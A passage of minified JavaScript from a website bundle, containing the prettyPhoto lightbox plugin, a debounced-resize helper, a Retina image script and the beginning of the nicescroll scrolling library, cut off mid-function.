t.prettyPhoto.changeGalleryPage("previous"),t.prettyPhoto.stopSlideshow(),!1})),$pp_pic_holder.find(".pp_content").hover((function(){$pp_pic_holder.find(".pp_gallery:not(.disabled)").fadeIn()}),(function(){$pp_pic_holder.find(".pp_gallery:not(.disabled)").fadeOut()})),itemWidth=57,$pp_gallery_li.each((function(e){t(this).find("a").click((function(){return t.prettyPhoto.changePage(e),t.prettyPhoto.stopSlideshow(),!1}))}))}settings.slideshow&&($pp_pic_holder.find(".pp_nav").prepend('<a href="#" class="pp_play">Play</a>'),$pp_pic_holder.find(".pp_nav .pp_play").click((function(){return t.prettyPhoto.startSlideshow(),!1}))),$pp_pic_holder.attr("class","pp_pic_holder "+settings.theme),$pp_overlay.css({opacity:0,height:t(document).height(),width:t(window).width()}).bind("click",(function(){settings.modal||t.prettyPhoto.close()})),t("a.pp_close").bind("click",(function(){return t.prettyPhoto.close(),!1})),settings.allow_expand&&t("a.pp_expand").bind("click",(function(){return t(this).hasClass("pp_expand")?(t(this).removeClass("pp_expand").addClass("pp_contract"),doresize=!1):(t(this).removeClass("pp_contract").addClass("pp_expand"),doresize=!0),r((function(){t.prettyPhoto.open()})),!1})),$pp_pic_holder.find(".pp_previous, .pp_nav .pp_arrow_previous").bind("click",(function(){return t.prettyPhoto.changePage("previous"),t.prettyPhoto.stopSlideshow(),!1})),$pp_pic_holder.find(".pp_next, .pp_nav .pp_arrow_next").bind("click",(function(){return t.prettyPhoto.changePage("next"),t.prettyPhoto.stopSlideshow(),!1})),u()}n=jQuery.extend({hook:"rel",animation_speed:"fast",ajaxcallback:function(){},slideshow:5e3,autoplay_slideshow:!1,opacity:.8,show_title:!0,allow_resize:!0,allow_expand:!0,default_width:500,default_height:344,counter_separator_label:"/",theme:"pp_default",horizontal_padding:20,hideflash:!1,wmode:"opaque",autoplay:!0,modal:!1,deeplinking:!0,overlay_gallery:!0,overlay_gallery_max:30,keyboard_shortcuts:!0,changepicturecallback:function(){},callback:function(){},ie6_fallback:!0,markup:'<div class="pp_pic_holder">       <div class="ppt">&nbsp;</div>       <div class="pp_top">        <div class="pp_left"></div>        <div class="pp_middle"></div>        <div class="pp_right"></div>       </div>       <div class="pp_content_container">        <div class="pp_left">        <div class="pp_right">         <div class="pp_content">          <div class="pp_loaderIcon"></div>          <div class="pp_fade">           <a href="#" class="pp_expand" title="Expand the image">Expand</a>           <div class="pp_hoverContainer">            <a class="pp_next" href="#">next</a>            <a class="pp_previous" href="#">previous</a>           </div>           <div id="pp_full_res"></div>           <div class="pp_details">            <div class="pp_nav">             <a href="#" class="pp_arrow_previous">Previous</a>             <p class="currentTextHolder">0/0</p>             <a href="#" class="pp_arrow_next">Next</a>            </div>            <p class="pp_description"></p>            <div class="pp_social">{pp_social}</div>            <a class="pp_close" href="#">Close</a>           </div>          </div>         </div>        </div>        </div>       </div>       <div class="pp_bottom">        <div class="pp_left"></div>        <div class="pp_middle"></div>        <div class="pp_right"></div>       </div>      </div>      <div class="pp_overlay"></div>',gallery_markup:'<div class="pp_gallery">         <a href="#" class="pp_arrow_previous">Previous</a>         <div>          <ul>           {gallery}          </ul>         </div>         <a href="#" class="pp_arrow_next">Next</a>        </div>',image_markup:'<img id="fullResImage" src="{path}" />',flash_markup:'<object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" width="{width}" height="{height}"><param name="wmode" value="{wmode}" /><param name="allowfullscreen" value="true" /><param name="allowscriptaccess" value="always" /><param name="movie" value="{path}" /><embed src="{path}" type="application/x-shockwave-flash" allowfullscreen="true" allowscriptaccess="always" width="{width}" height="{height}" wmode="{wmode}"></embed></object>',quicktime_markup:'<object classid="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B" codebase="http://www.apple.com/qtactivex/qtplugin.cab" height="{height}" width="{width}"><param name="src" value="{path}"><param name="autoplay" value="{autoplay}"><param name="type" value="video/quicktime"><embed src="{path}" height="{height}" width="{width}" autoplay="{autoplay}" type="video/quicktime" pluginspage="http://www.apple.com/quicktime/download/"></embed></object>',iframe_markup:'<iframe src ="{path}" width="{width}" height="{height}" frameborder="no"></iframe>',inline_markup:'<div class="pp_inline">{content}</div>',custom_markup:"",social_tools:'<div class="twitter"><a href="http://twitter.com/share" class="twitter-share-button" data-count="none">Tweet</a><script type="text/javascript" src="http://platform.twitter.com/widgets.js"><\/script></div><div class="facebook"><iframe src="//www.facebook.com/plugins/like.php?locale=en_US&href={location_href}&layout=button_count&show_faces=true&width=500&action=like&font&colorscheme=light&height=23" scrolling="no" frameborder="0" style="border:none; overflow:hidden; width:500px; height:23px;" allowTransparency="true"></iframe></div>'},n);var f,m,g,v,_,y,b,w=this,x=!1,S=t(window).height(),z=t(window).width();return doresize=!0,scroll_pos=d(),t(window).unbind("resize.prettyphoto").bind("resize.prettyphoto",(function(){u(),S=t(window).height(),z=t(window).width(),"undefined"!=typeof $pp_overlay&&$pp_overlay.height(t(document).height()).width(z)})),n.keyboard_shortcuts&&t(document).unbind("keydown.prettyphoto").bind("keydown.prettyphoto",(function(e){if("undefined"!=typeof $pp_pic_holder&&$pp_pic_holder.is(":visible"))switch(e.keyCode){case 37:t.prettyPhoto.changePage("previous"),e.preventDefault();break;case 39:t.prettyPhoto.changePage("next"),e.preventDefault();break;case 27:settings.modal||t.prettyPhoto.close(),e.preventDefault()}})),t.prettyPhoto.initialize=function(){return settings=n,"pp_default"==settings.theme&&(settings.horizontal_padding=16),theRel=t(this).attr(settings.hook),galleryRegExp=/\[(?:.*)\]/,isSet=!!galleryRegExp.exec(theRel),pp_images=isSet?jQuery.map(w,(function(e){return-1!=t(e).attr(settings.hook).indexOf(theRel)?t(e).attr("href"):void 0})):t.makeArray(t(this).attr("href")),pp_titles=isSet?jQuery.map(w,(function(e){return-1!=t(e).attr(settings.hook).indexOf(theRel)?t(e).find("img").attr("alt")?t(e).find("img").attr("alt"):"":void 0})):t.makeArray(t(this).find("img").attr("alt")),pp_descriptions=isSet?jQuery.map(w,(function(e){return-1!=t(e).attr(settings.hook).indexOf(theRel)?t(e).attr("title")?t(e).attr("title"):"":void 0})):t.makeArray(t(this).attr("title")),pp_images.length>settings.overlay_gallery_max&&(settings.overlay_gallery=!1),set_position=jQuery.inArray(t(this).attr("href"),pp_images),rel_index=isSet?set_position:t("a["+settings.hook+"^='"+theRel+"']").index(t(this)),h(),settings.allow_resize&&t(window).bind("scroll.prettyphoto",(function(){u()})),t.prettyPhoto.open(),!1},t.prettyPhoto.open=function(e){return"undefined"==typeof settings&&(settings=n,pp_images=t.makeArray(arguments[0]),pp_titles=t.makeArray(arguments[1]?arguments[1]:""),pp_descriptions=t.makeArray(arguments[2]?arguments[2]:""),isSet=pp_images.length>1,set_position=arguments[3]?arguments[3]:0,h(e.target)),settings.hideflash&&t("object,embed,iframe[src*=youtube],iframe[src*=vimeo]").css("visibility","hidden"),a(t(pp_images).size()),t(".pp_loaderIcon").show(),settings.deeplinking&&i(),settings.social_tools&&(facebook_like_link=settings.social_tools.replace("{location_href}",encodeURIComponent(location.href)),$pp_pic_holder.find(".pp_social").html(facebook_like_link)),$ppt.is(":hidden")&&$ppt.css("opacity",0).show(),$pp_overlay.show().fadeTo(settings.animation_speed,settings.opacity),$pp_pic_holder.find(".currentTextHolder").text(set_position+1+settings.counter_separator_label+t(pp_images).size()),void 0!==pp_descriptions[set_position]&&""!=pp_descriptions[set_position]?$pp_pic_holder.find(".pp_description").show().html(unescape(pp_descriptions[set_position])):$pp_pic_holder.find(".pp_description").hide(),movie_width=parseFloat(o("width",pp_images[set_position]))?o("width",pp_images[set_position]):settings.default_width.toString(),movie_height=parseFloat(o("height",pp_images[set_position]))?o("height",pp_images[set_position]):settings.default_height.toString(),x=!1,-1!=movie_height.indexOf("%")&&(movie_height=parseFloat(t(window).height()*parseFloat(movie_height)/100-150),x=!0),-1!=movie_width.indexOf("%")&&(movie_width=parseFloat(t(window).width()*parseFloat(movie_width)/100-150),x=!0),$pp_pic_holder.fadeIn((function(){switch($ppt.html(settings.show_title&&""!=pp_titles[set_position]&&void 0!==pp_titles[set_position]?unescape(pp_titles[set_position]):"&nbsp;"),imgPreloader="",skipInjection=!1,p(pp_images[set_position])){case"image":imgPreloader=new Image,nextImage=new Image,isSet&&set_position<t(pp_images).size()-1&&(nextImage.src=pp_images[set_position+1]),prevImage=new Image,isSet&&pp_images[set_position-1]&&(prevImage.src=pp_images[set_position-1]),$pp_pic_holder.find("#pp_full_res")[0].innerHTML=settings.image_markup.replace(/{path}/g,pp_images[set_position]),imgPreloader.onload=function(){f=l(imgPreloader.width,imgPreloader.height),s()},imgPreloader.onerror=function(){alert("Image cannot be loaded. Make sure the path is correct and image exist."),t.prettyPhoto.close()},imgPreloader.src=pp_images[set_position];break;case"youtube":f=l(movie_width,movie_height),movie_id=o("v",pp_images[set_position]),""==movie_id&&(movie_id=pp_images[set_position].split("youtu.be/"),movie_id=movie_id[1],movie_id.indexOf("?")>0&&(movie_id=movie_id.substr(0,movie_id.indexOf("?"))),movie_id.indexOf("&")>0&&(movie_id=movie_id.substr(0,movie_id.indexOf("&")))),movie="http://www.youtube.com/embed/"+movie_id,movie+=o("rel",pp_images[set_position])?"?rel="+o("rel",pp_images[set_position]):"?rel=1",settings.autoplay&&(movie+="&autoplay=1"),toInject=settings.iframe_markup.replace(/{width}/g,f.width).replace(/{height}/g,f.height).replace(/{wmode}/g,settings.wmode).replace(/{path}/g,movie);break;case"vimeo":f=l(movie_width,movie_height),movie_id=pp_images[set_position];var e=movie_id.match(/http(s?):\/\/(www\.)?vimeo.com\/(\d+)/);movie="http://player.vimeo.com/video/"+e[3]+"?title=0&byline=0&portrait=0",settings.autoplay&&(movie+="&autoplay=1;"),vimeo_width=f.width+"/embed/?moog_width="+f.width,toInject=settings.iframe_markup.replace(/{width}/g,vimeo_width).replace(/{height}/g,f.height).replace(/{path}/g,movie);break;case"quicktime":(f=l(movie_width,movie_height)).height+=15,f.contentHeight+=15,f.containerHeight+=15,toInject=settings.quicktime_markup.replace(/{width}/g,f.width).replace(/{height}/g,f.height).replace(/{wmode}/g,settings.wmode).replace(/{path}/g,pp_images[set_position]).replace(/{autoplay}/g,settings.autoplay);break;case"flash":f=l(movie_width,movie_height),flash_vars=pp_images[set_position],flash_vars=flash_vars.substring(pp_images[set_position].indexOf("flashvars")+10,pp_images[set_position].length),filename=pp_images[set_position],filename=filename.substring(0,filename.indexOf("?")),toInject=settings.flash_markup.replace(/{width}/g,f.width).replace(/{height}/g,f.height).replace(/{wmode}/g,settings.wmode).replace(/{path}/g,filename+"?"+flash_vars);break;case"iframe":f=l(movie_width,movie_height),frame_url=pp_images[set_position],frame_url=frame_url.substr(0,frame_url.indexOf("iframe")-1),toInject=settings.iframe_markup.replace(/{width}/g,f.width).replace(/{height}/g,f.height).replace(/{path}/g,frame_url);break;case"ajax":doresize=!1,f=l(movie_width,movie_height),doresize=!0,skipInjection=!0,t.get(pp_images[set_position],(function(t){toInject=settings.inline_markup.replace(/{content}/g,t),$pp_pic_holder.find("#pp_full_res")[0].innerHTML=toInject,s()}));break;case"custom":f=l(movie_width,movie_height),toInject=settings.custom_markup;break;case"inline":myClone=t(pp_images[set_position]).clone().append('<br clear="all" />').css({width:settings.default_width}).wrapInner('<div id="pp_full_res"><div class="pp_inline"></div></div>').appendTo(t("body")).show(),doresize=!1,f=l(t(myClone).width(),t(myClone).height()),doresize=!0,t(myClone).remove(),toInject=settings.inline_markup.replace(/{content}/g,t(pp_images[set_position]).html())}imgPreloader||skipInjection||($pp_pic_holder.find("#pp_full_res")[0].innerHTML=toInject,s())})),!1},t.prettyPhoto.changePage=function(e){currentGalleryPage=0,"previous"==e?(set_position--,set_position<0&&(set_position=t(pp_images).size()-1)):"next"==e?(set_position++,set_position>t(pp_images).size()-1&&(set_position=0)):set_position=e,rel_index=set_position,doresize||(doresize=!0),settings.allow_expand&&t(".pp_contract").removeClass("pp_contract").addClass("pp_expand"),r((function(){t.prettyPhoto.open()}))},t.prettyPhoto.changeGalleryPage=function(t){"next"==t?(currentGalleryPage++,currentGalleryPage>totalPage&&(currentGalleryPage=0)):"previous"==t?(currentGalleryPage--,currentGalleryPage<0&&(currentGalleryPage=totalPage)):currentGalleryPage=t,slide_speed="next"==t||"previous"==t?settings.animation_speed:0,slide_to=currentGalleryPage*itemsPerPage*itemWidth,$pp_gallery.find("ul").animate({left:-slide_to},slide_speed)},t.prettyPhoto.startSlideshow=function(){void 0===b?($pp_pic_holder.find(".pp_play").unbind("click").removeClass("pp_play").addClass("pp_pause").click((function(){return t.prettyPhoto.stopSlideshow(),!1})),b=setInterval(t.prettyPhoto.startSlideshow,settings.slideshow)):t.prettyPhoto.changePage("next")},t.prettyPhoto.stopSlideshow=function(){$pp_pic_holder.find(".pp_pause").unbind("click").removeClass("pp_pause").addClass("pp_play").click((function(){return t.prettyPhoto.startSlideshow(),!1})),clearInterval(b),b=void 0},t.prettyPhoto.close=function(){$pp_overlay.is(":animated")||(t.prettyPhoto.stopSlideshow(),$pp_pic_holder.stop().find("object,embed").css("visibility","hidden"),t("div.pp_pic_holder,div.ppt,.pp_fade").fadeOut(settings.animation_speed,(function(){t(this).remove()})),$pp_overlay.fadeOut(settings.animation_speed,(function(){settings.hideflash&&t("object,embed,iframe[src*=youtube],iframe[src*=vimeo]").css("visibility","visible"),t(this).remove(),t(window).unbind("scroll.prettyphoto"),-1!==location.href.indexOf("#prettyPhoto")&&(location.hash="prettyPhoto"),settings.callback(),doresize=!0,m=!1,delete settings})))},!pp_alreadyInitialized&&e()&&(pp_alreadyInitialized=!0,hashIndex=e(),hashRel=hashIndex,hashIndex=hashIndex.substring(hashIndex.indexOf("/")+1,hashIndex.length-1),hashRel=hashRel.substring(0,hashRel.indexOf("/")),setTimeout((function(){t("a["+n.hook+"^='"+hashRel+"']:eq("+hashIndex+")").trigger("click")}),50)),this.unbind("click.prettyphoto").bind("click.prettyphoto",t.prettyPhoto.initialize)}}(jQuery);var pp_alreadyInitialized=!1;!function(t){var e,i,o=t.event;e=o.special.debouncedresize={setup:function(){t(this).on("resize",e.handler)},teardown:function(){t(this).off("resize",e.handler)},handler:function(t,n){var s=this,r=arguments,a=function(){t.type="debouncedresize",o.dispatch.apply(s,r)};i&&clearTimeout(i),n?a():i=setTimeout(a,e.threshold)},threshold:150}}(jQuery),window.mfn_retina_disable||function(){function t(){}function e(t){return s.retinaImageSuffix+t}function i(t,i){if(this.path=t||"",null!=i)this.at_2x_path=i,this.perform_check=!1;else{if(void 0!==document.createElement){var o=document.createElement("a");o.href=this.path,o.pathname=o.pathname.replace(r,e),this.at_2x_path=o.href}else{var n=this.path.split("?");n[0]=n[0].replace(r,e),this.at_2x_path=n.join("?")}this.perform_check=!0}}function o(t){this.el=t,this.path=new i(this.el.getAttribute("src"),this.el.getAttribute("data-at2x"));var e=this;this.path.check_2x_variant((function(t){t&&e.swap()}))}var n="undefined"==typeof exports?window:exports,s={retinaImageSuffix:"@2x",check_mime_type:!0,force_original_dimensions:!0};n.Retina=t,t.configure=function(t){for(var e in null===t&&(t={}),t)t.hasOwnProperty(e)&&(s[e]=t[e])},t.init=function(t){null===t&&(t=n);var e=t.onload||function(){};t.onload=function(){var t,i,n=document.getElementsByTagName("img"),s=[];for(t=0;t<n.length;t+=1)(i=n[t]).getAttributeNode("data-no-retina")||s.push(new o(i));e()}},t.isRetina=function(){return n.devicePixelRatio>1||!(!n.matchMedia||!n.matchMedia("(-webkit-min-device-pixel-ratio: 1.5), (min--moz-device-pixel-ratio: 1.5), (-o-min-device-pixel-ratio: 3/2), (min-resolution: 1.5dppx)").matches)};var r=/\.\w+$/;n.RetinaImagePath=i,i.confirmed_paths=[],i.prototype.is_external=function(){return!(!this.path.match(/^https?\:/i)||this.path.match("//"+document.domain))},i.prototype.check_2x_variant=function(t){var e,o=this;return this.is_external()?t(!1):this.perform_check||void 0===this.at_2x_path||null===this.at_2x_path?this.at_2x_path in i.confirmed_paths?t(!0):((e=new XMLHttpRequest).open("HEAD",this.at_2x_path),e.onreadystatechange=function(){if(4!==e.readyState)return t(!1);if(e.status>=200&&e.status<=399){if(s.check_mime_type){var n=e.getResponseHeader("Content-Type");if(null===n||!n.match(/^image/i))return t(!1)}return i.confirmed_paths.push(o.at_2x_path),t(!0)}return t(!1)},void e.send()):t(!0)},n.RetinaImage=o,o.prototype.swap=function(t){void 0===t&&(t=this.path.at_2x_path);var e=this;!function i(){e.el.complete?(s.force_original_dimensions&&(e.el.setAttribute("width",e.el.offsetWidth),e.el.setAttribute("height",e.el.offsetHeight)),e.el.setAttribute("src",t)):setTimeout(i,5)}()},t.isRetina()&&t.init(n)}(),function(t){"function"==typeof define&&define.amd?define(["jquery"],t):"object"==typeof exports?module.exports=t(require("jquery")):t(jQuery)}((function(t){"use strict";var e=!1,i=!1,o=0,n=2e3,s=0,r=t,a=["webkit","ms","moz","o"],l=window.requestAnimationFrame||!1,c=window.cancelAnimationFrame||!1;if(!l)for(var p in a){var u=a[p];l||(l=window[u+"RequestAnimationFrame"]),c||(c=window[u+"CancelAnimationFrame"]||window[u+"CancelRequestAnimationFrame"])}var d=window.MutationObserver||window.WebKitMutationObserver||!1,h={zindex:"auto",cursoropacitymin:0,cursoropacitymax:1,cursorcolor:"#424242",cursorwidth:"5px",cursorborder:"1px solid #fff",cursorborderradius:"5px",scrollspeed:60,mousescrollstep:24,touchbehavior:!1,hwacceleration:!0,usetransition:!0,boxzoom:!1,dblclickzoom:!0,gesturezoom:!0,grabcursorenabled:!0,autohidemode:!0,background:"",iframeautoresize:!0,cursorminheight:32,preservenativescrolling:!0,railoffset:!1,railhoffset:!1,bouncescroll:!0,spacebarenabled:!0,railpadding:{top:0,right:0,left:0,bottom:0},disableoutline:!0,horizrailenabled:!0,railalign:"right",railvalign:"bottom",enabletranslate3d:!0,enablemousewheel:!0,enablekeyboard:!0,smoothscroll:!0,sensitiverail:!0,enablemouselockapi:!0,cursorfixedheight:!1,directionlockdeadzone:6,hidecursordelay:400,nativeparentscrolling:!0,enablescrollonselection:!0,overflowx:!0,overflowy:!0,cursordragspeed:.3,rtlmode:"auto",cursordragontouch:!1,oneaxismousemode:"auto",scriptpath:function(){var t=document.getElementsByTagName("script"),e=t.length?t[t.length-1].src.split("?")[0]:"";return e.split("/").length>0?e.split("/").slice(0,-1).join("/")+"/":""}(),preventmultitouchscrolling:!0},f=!1,m=function(){if(f)return f;var t=document.createElement("DIV"),e=t.style,i=navigator.userAgent,o=navigator.platform,n={};n.haspointerlock="pointerLockElement"in document||"webkitPointerLockElement"in document||"mozPointerLockElement"in document,n.isopera="opera"in window,n.isopera12=n.isopera&&"getUserMedia"in navigator,n.isoperamini="[object OperaMini]"===Object.prototype.toString.call(window.operamini),n.isie="all"in document&&"attachEvent"in t&&!n.isopera,n.isieold=n.isie&&!("msInterpolationMode"in e),n.isie7=n.isie&&!n.isieold&&(!("documentMode"in document)||7==document.documentMode),n.isie8=n.isie&&"documentMode"in document&&8==document.documentMode,n.isie9=n.isie&&"performance"in window&&document.documentMode>=9,n.isie10=n.isie&&"performance"in window&&10==document.documentMode,n.isie11="msRequestFullscreen"in t&&document.documentMode>=11,n.isieedge=navigator.userAgent.match(/Edge\/12\./),n.isie9mobile=/iemobile.9/i.test(i),n.isie9mobile&&(n.isie9=!1),n.isie7mobile=!n.isie9mobile&&n.isie7&&/iemobile/i.test(i),n.ismozilla="MozAppearance"in e,n.iswebkit="WebkitAppearance"in e,n.ischrome="chrome"in window,n.ischrome22=n.ischrome&&n.haspointerlock,n.ischrome26=n.ischrome&&"transition"in e,n.cantouch="ontouchstart"in document.documentElement||"ontouchstart"in window,n.hasmstouch=window.MSPointerEvent||!1,n.hasw3ctouch=!!window.PointerEvent&&(navigator.MaxTouchPoints>0||navigator.msMaxTouchPoints>0),n.ismac=/^mac$/i.test(o),n.isios=n.cantouch&&/iphone|ipad|ipod/i.test(o),n.isios4=n.isios&&!("seal"in Object),n.isios7=n.isios&&"webkitHidden"in document,n.isandroid=/android/i.test(i),n.haseventlistener="addEventListener"in t,n.trstyle=!1,n.hastransform=!1,n.hastranslate3d=!1,n.transitionstyle=!1,n.hastransition=!1,n.transitionend=!1;var s,r=["transform","msTransform","webkitTransform","MozTransform","OTransform"];for(s=0;s<r.length;s++)if(void 0!==e[r[s]]){n.trstyle=r[s];break}n.hastransform=!!n.trstyle,n.hastransform&&(e[n.trstyle]="translate3d(1px,2px,3px)",n.hastranslate3d=/translate3d/.test(e[n.trstyle])),n.transitionstyle=!1,n.prefixstyle="",n.transitionend=!1,r=["transition","webkitTransition","msTransition","MozTransition","OTransition","OTransition","KhtmlTransition"];var a=["","-webkit-","-ms-","-moz-","-o-","-o","-khtml-"],l=["transitionend","webkitTransitionEnd","msTransitionEnd","transitionend","otransitionend","oTransitionEnd","KhtmlTransitionEnd"];for(s=0;s<r.length;s++)if(r[s]in e){n.transitionstyle=r[s],n.prefixstyle=a[s],n.transitionend=l[s];break}return n.ischrome26&&(n.prefixstyle=a[1]),n.hastransition=n.transitionstyle,n.cursorgrabvalue=function(){var t=["-webkit-grab","-moz-grab","grab"];(n.ischrome&&!n.ischrome22||n.isie)&&(t=[]);for(var i=0;i<t.length;i++){var o=t[i];if(e.cursor=o,e.cursor==o)return o}return"url(//mail.google.com/mail/images/2/openhand.cur),n-resize"}(),n.hasmousecapture="setCapture"in t,n.hasMutationObserver=!1!==d,t=null,f=n,n},g=function(t,a){function p(){var t=_.doc.css(b.trstyle);return!(!t||"matrix"!=t.substr(0,6))&&t.replace(/^.*\((.*)\)$/g,"$1").replace(/px/g,"").split(/, +/)}function u(t,e,i){var o=t.css(e),n=parseFloat(o);if(isNaN(n)){var s=3==(n=z[o]||0)?i?_.win.outerHeight()-_.win.innerHeight():_.win.outerWidth()-_.win.innerWidth():1;return _.isie8&&n&&(n+=1),s?n:0}return n}function f(t,e,i,o){_._bind(t,e,(function(o){var n={original:o=o||window.event,target:o.target||o.srcElement,type:"wheel",deltaMode:"MozMousePixelScroll"==o.type?0:1,deltaX:0,deltaZ:0,preventDefault:function(){return o.preventDefault?o.preventDefault():o.returnValue=!1,!1},stopImmediatePropagation:function(){o.stopImmediatePropagation?o.stopImmediatePropagation():o.cancelBubble=!0}};return"mousewheel"==e?(n.deltaY=-1/40*o.wheelDelta,o.wheelDeltaX&&(n.deltaX=-1/40*o.wheelDeltaX)):n.deltaY=o.detail,i.call(t,n)}),o)}function g(t,e,i){var o,n;(0==t.deltaMode?(o=-Math.floor(t.deltaX*(_.opt.mousescrollstep/54)),n=-Math.floor(t.deltaY*(_.opt.mousescrollstep/54))):1==t.deltaMode&&(o=-Math.floor(t.deltaX*_.opt.mousescrollstep),n=-Math.floor(t.deltaY*_.opt.mousescrollstep)),e&&_.opt.oneaxismousemode&&0==o&&n&&(o=n,n=0,i))&&((0>o?_.getScrollLeft()>=_.page.maxw:_.getScrollLeft()<=0)&&(n=o,o=0));if(o&&(_.scrollmom&&_.scrollmom.stop(),_.lastdeltax+=o,_.debounced("mousewheelx",(function(){var t=_.lastdeltax;_.lastdeltax=0,_.rail.drag||_.doScrollLeftBy(t)}),15)),n){if(_.opt.nativeparentscrolling&&i&&!_.ispage&&!_.zoomactive)if(0>n){if(_.getScrollTop()>=_.page.maxh)return!0}else if(_.getScrollTop()<=0)return!0;_.scrollmom&&_.scrollmom.stop(),_.lastdeltay+=n,_.debounced("mousewheely",(function(){var t=_.lastdeltay;_.lastdeltay=0,_.rail.drag||_.doScrollBy(t)}),15)}return t.stopImmediatePropagation(),t.preventDefault()}var _=this;if(this.version="3.6.6",this.name="nicescroll",this.me=a,this.opt={doc:r("body"),win:!1},r.extend(this.opt,h),this.opt.snapbackspeed=80,t)for(var y in _.opt)void 0!==t[y]&&(_.opt[y]=t[y]);this.doc=_.opt.doc,this.iddoc=this.doc&&this.doc[0]&&this.doc[0].id||"",this.ispage=/^BODY|HTML/.test(_.opt.win?_.opt.win[0].nodeName:this.doc[0].nodeName),this.haswrapper=!1!==_.opt.win,this.win=_.opt.win||(this.ispage?r(window):this.doc),this.docscroll=this.ispage&&!this.haswrapper?r(window):this.win,this.body=r("body"),this.viewport=!1,this.isfixed=!1,this.iframe=!1,this.isiframe="IFRAME"==this.doc[0].nodeName&&"IFRAME"==this.win[0].nodeName,this.istextarea="TEXTAREA"==this.win[0].nodeName,this.forcescreen=!1,this.canshowonmouseevent="scroll"!=_.opt.autohidemode,this.onmousedown=!1,this.onmouseup=!1,this.onmousemove=!1,this.onmousewheel=!1,this.onkeypress=!1,this.ongesturezoom=!1,this.onclick=!1,this.onscrollstart=!1,this.onscrollend=!1,this.onscrollcancel=!1,this.onzoomin=!1,this.onzoomout=!1,this.view=!1,this.page=!1,this.scroll={x:0,y:0},this.scrollratio={x:0,y:0},this.cursorheight=20,this.scrollvaluemax=0,this.isrtlmode="auto"==this.opt.rtlmode?"rtl"==(this.win[0]==window?this.body:this.win).css("direction"):!0===this.opt.rtlmode,this.scrollrunning=!1,this.scrollmom=!1,this.observer=!1,this.observerremover=!1,this.observerbody=!1;do{this.id="ascrail"+n++}while(document.getElementById(this.id));this.rail=!1,this.cursor=!1,this.cursorfreezed=!1,this.selectiondrag=!1,this.zoom=!1,this.zoomactive=!1,this.hasfocus=!1,this.hasmousefocus=!1,this.visibility=!0,this.railslocked=!1,this.locked=!1,this.hidden=!1,this.cursoractive=!0,this.wheelprevented=!1,this.overflowx=_.opt.overflowx,this.overflowy=_.opt.overflowy,this.nativescrollingarea=!1,this.checkarea=0,this.events=[],this.saved={},this.delaylist={},this.synclist={},this.lastdeltax=0,this.lastdeltay=0,this.detected=m();var b=r.extend({},this.detected);this.canhwscroll=b.hastransform&&_.opt.hwacceleration,this.ishwscroll=this.canhwscroll&&_.haswrapper,this.hasreversehr=this.isrtlmode&&!b.iswebkit,this.istouchcapable=!1,!b.cantouch||b.isios||b.isandroid||!b.iswebkit&&!b.ismozilla||(this.istouchcapable=!0,b.cantouch=!1),_.opt.enablemouselockapi||(b.hasmousecapture=!1,b.haspointerlock=!1),this.debounced=function(t,e,i){var o=_.delaylist[t];_.delaylist[t]=e,o||(_.debouncedelayed=setTimeout((function(){if(_){var e=_.delaylist[t];_.delaylist[t]=!1,e.call(_)}}),i))};var w=!1;this.synched=function(t,e){return _.synclist[t]=e,w||(l((function(){for(var t in w=!1,_.synclist){var e=_.synclist[t];e&&e.call(_),_.synclist[t]=!1}})),w=!0),t},this.unsynched=function(t){_.synclist[t]&&(_.synclist[t]=!1)},this.css=function(t,e){for(var i in e)_.saved.css.push([t,i,t.css(i)]),t.css(i,e[i])},this.scrollTop=function(t){return void 0===t?_.getScrollTop():_.setScrollTop(t)},this.scrollLeft=function(t){return void 0===t?_.getScrollLeft():_.setScrollLeft(t)};var x=function(t,e,i,o,n,s,r){this.st=t,this.ed=e,this.spd=i,this.p1=o||0,this.p2=n||1,this.p3=s||0,this.p4=r||1,this.ts=(new Date).getTime(),this.df=this.ed-this.st};if(x.prototype={B2:function(t){return 3*t*t*(1-t)},B3:function(t){return 3*t*(1-t)*(1-t)},B4:function(t){return(1-t)*(1-t)*(1-t)},getNow:function(){var t=1-((new Date).getTime()-this.ts)/this.spd,e=this.B2(t)+this.B3(t)+this.B4(t);return 0>t?this.ed:this.st+Math.round(this.df*e)},update:function(t,e){return this.st=this.getNow(),this.ed=t,this.spd=e,this.ts=(new Date).getTime(),this.df=this.ed-this.st,this}},this.ishwscroll){this.doc.translate={x:0,y:0,tx:"0px",ty:"0px"},b.hastranslate3d&&b.isios&&this.doc.css("-webkit-backface-visibility","hidden"),this.getScrollTop=function(t){if(!t){var e=p();if(e)return 16==e.length?-e[13]:-e[5];if(_.timerscroll&&_.timerscroll.bz)return _.timerscroll.bz.getNow()}return _.doc.translate.y},this.getScrollLeft=function(t){if(!t){var e=p();if(e)return 16==e.length?-e[12]:-e[4];if(_.timerscroll&&_.timerscroll.bh)return _.timerscroll.bh.getNow()}return _.doc.translate.x},this.notifyScrollEvent=function(t){var e=document.createEvent("UIEvents");e.initUIEvent("scroll",!1,!0,window,1),e.niceevent=!0,t.dispatchEvent(e)};var S=this.isrtlmode?1:-1;b.hastranslate3d&&_.opt.enabletranslate3d?(this.setScrollTop=function(t,e){_.doc.translate.y=t,_.doc.translate.ty=-1*t+"px",_.doc.css(b.trstyle,"translate3d("+_.doc.translate.tx+","+_.doc.translate.ty+",0px)"),e||_.notifyScrollEvent(_.win[0])},this.setScrollLeft=function(t,e){_.doc.translate.x=t,_.doc.translate.tx=t*S+"px",_.doc.css(b.trstyle,"translate3d("+_.doc.translate.tx+","+_.doc.translate.ty+",0px)"),e||_.notifyScrollEvent(_.win[0])}):(this.setScrollTop=function(t,e){_.doc.translate.y=t,_.doc.translate.ty=-1*t+"px",_.doc.css(b.trstyle,"translate("+_.doc.translate.tx+","+_.doc.translate.ty+")"),e||_.notifyScrollEvent(_.win[0])},this.setScrollLeft=function(t,e){_.doc.translate.x=t,_.doc.translate.tx=t*S+"px",_.doc.css(b.trstyle,"translate("+_.doc.translate.tx+","+_.doc.translate.ty+")"),e||_.notifyScrollEvent(_.win[0])})}else this.getScrollTop=function(){return _.docscroll.scrollTop()},this.setScrollTop=function(t){return setTimeout((function(){_.docscroll.scrollTop(t)}),1)},this.getScrollLeft=function(){return _.detected.ismozilla&&_.isrtlmode?Math.abs(_.docscroll.scrollLeft()):_.docscroll.scrollLeft()},this.setScrollLeft=function(t){return setTimeout((function(){_.docscroll.scrollLeft(_.detected.ismozilla&&_.isrtlmode?-t:t)}),1)};this.getTarget=function(t){return!!t&&(t.target?t.target:!!t.srcElement&&t.srcElement)},this.hasParent=function(t,e){if(!t)return!1;for(var 